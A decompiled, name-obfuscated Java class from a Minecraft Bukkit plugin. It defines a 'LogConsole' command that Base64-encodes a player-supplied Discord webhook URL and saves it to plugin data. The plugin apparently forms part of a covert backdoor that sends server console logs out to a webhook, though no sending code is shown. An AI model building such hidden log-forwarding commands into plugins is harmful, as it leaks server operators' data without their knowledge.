/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import java.util.Base64;
import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.data.DataManager;
import me.system.runner.utils.Settings;
import org.bukkit.entity.Player;

public class LogconsoleCommand
extends Command {
    @Override
    public void execute(Core lllIIllIlIlllII, String lllIIllIlIllIll, String[] lllIIllIlIllIII, Player lllIIllIlIllIIl) {
        if (lllIIllIlIllIII.length <= 1) {
            lllIIllIlIllIIl.sendMessage(Settings.USAGE("LogConsole < discord webhook URL>"));
        } else {
            byte[] lllIIllIlIllllI = Base64.getEncoder().encode(lllIIllIlIllIII[1].getBytes());
            DataManager.getData().set("wh", (Object)new String(lllIIllIlIllllI));
            DataManager.saveData();
            lllIIllIlIllIIl.sendMessage(Settings.PREFIX("The webhook URL has been set"));
        }
    }

    public LogconsoleCommand() {
        LogconsoleCommand lllIIllIllIIIlI;
    }
}

